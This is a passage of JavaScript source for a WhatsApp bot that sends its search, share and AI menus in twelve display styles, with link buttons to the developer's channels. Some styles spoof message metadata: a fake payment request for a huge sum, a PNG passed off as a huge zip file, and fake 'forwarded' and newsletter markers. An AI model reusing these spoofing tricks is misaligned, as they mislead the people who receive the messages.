              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'searchmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${searchmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'sharemenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${sharemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'aimenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${aimenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
